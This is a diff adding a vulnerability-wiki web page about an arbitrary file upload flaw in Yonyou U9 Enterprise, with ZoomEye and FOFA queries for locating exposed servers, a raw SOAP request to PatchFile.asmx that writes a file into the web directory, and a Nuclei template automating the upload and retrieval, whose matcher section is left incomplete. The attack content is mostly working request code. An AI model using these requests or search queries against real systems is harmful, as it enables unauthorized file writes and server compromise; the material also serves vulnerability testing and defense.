@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%E7%B3%BB%E7%BB%9F-U9%E4%BC%81%E4%B8%9A%E7%89%88%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>用友系统 U9企业版存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7528\u53cb\u7cfb\u7edf-U9\u4f01\u4e1a\u7248\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "ZoomEye", url: "#zoomeye", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "Nuclei", url: "#nuclei", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%95%85%E6%8D%B7%E9%80%9ACRM%E7%B3%BB%E7%BB%9Fnewleadset.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%95%85%E6%8D%B7%E9%80%9ACRM%E7%B3%BB%E7%BB%9Fnewleadset.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        畅捷通CRM系统newleadset.php接口存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86uploadApk%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86uploadApk%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        用友移动系统管理uploadApk接口存在任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="-u9">用友系统-U9企业版存在任意文件上传漏洞<a class="headerlink" href="#-u9" title="Permanent link">&para;</a></h2>
+<h2 id="zoomeye">ZoomEye<a class="headerlink" href="#zoomeye" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app:&quot;用友 U9&quot;
+</code></pre></div>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title==&quot;        U9-登录    &quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+Host: {}
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: .ASPXANONYMOUS=1OJZqnZ03AEkAAAAZGQ2ZDU0NzYtMDdiZS00YWJhLTk2ZTMtNmRhYTgxNDM5OTNi0; ASP.NET_SessionId=md4bw5fgleu1cxfdwk4w0o4n
+Connection: close
+Content-Type: text/xml; charset=utf-8
+Content-Length: 433
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;SaveFile xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;binData&gt;VXBsb2FkLXN1Y2Nlc3NmdWxseQ==&lt;/binData&gt;
+      &lt;path&gt;./&lt;/path&gt;
+      &lt;fileName&gt;123.txt&lt;/fileName&gt;
+    &lt;/SaveFile&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div>
+<img alt="b23cd5adb255337154278fb1c62bf2fc" src="https://github.com/wy876/POC/assets/139549762/6c927096-24d0-4b55-8037-fff767959054" /></p>
+<p>文件上传路径
+<a href="http://127.0.0.1/CS/Office/AutoUpdates/123.txt">http://127.0.0.1/CS/Office/AutoUpdates/123.txt</a></p>
+<p><img alt="5eb3b885723f85ed25b104c10f08e7c1" src="https://github.com/wy876/POC/assets/139549762/e283a6a2-3c77-4121-816e-4865ab5fb8b5" /></p>
+<h2 id="nuclei">Nuclei<a class="headerlink" href="#nuclei" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: yonyou-U9-PatchFile-asmx-uploadfile
+
+info:
+  name: yonyou-U9-PatchFile-asmx-uploadfile
+  author: 渗透安全HackTwo
+  severity: high
+
+  description: |
+    漏洞测试-公众号-渗透安全HackTwo
+  reference:
+    - https://127.0.0.1
+  tags: auto
+
+variables:
+  filename: &quot;{{to_lower(rand_base(10))}}&quot;
+  boundary: &quot;{{to_lower(rand_base(20))}}&quot;
+
+http:
+  - raw:
+      - |
+        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+        Host:{{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9b
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+        &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+        &lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+          &lt;soap:Body&gt;
+            &lt;SaveFile xmlns=&quot;http://tempuri.org/&quot;&gt;
+              &lt;binData&gt;VXBsb2FkLXN1Y2Nlc3NmdWxseQ==&lt;/binData&gt;
+              &lt;path&gt;./&lt;/path&gt;
+              &lt;fileName&gt;{{filename}}.txt&lt;/fileName&gt;
+            &lt;/SaveFile&gt;
+          &lt;/soap:Body&gt;
+        &lt;/soap:Envelope&gt;
+
+
+      - |
+        GET /CS/Office/AutoUpdates/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%95%85%E6%8D%B7%E9%80%9ACRM%E7%B3%BB%E7%BB%9Fnewleadset.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%95%85%E6%8D%B7%E9%80%9ACRM%E7%B3%BB%E7%BB%9Fnewleadset.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        畅捷通CRM系统newleadset.php接口存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86uploadApk%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86uploadApk%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        用友移动系统管理uploadApk接口存在任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
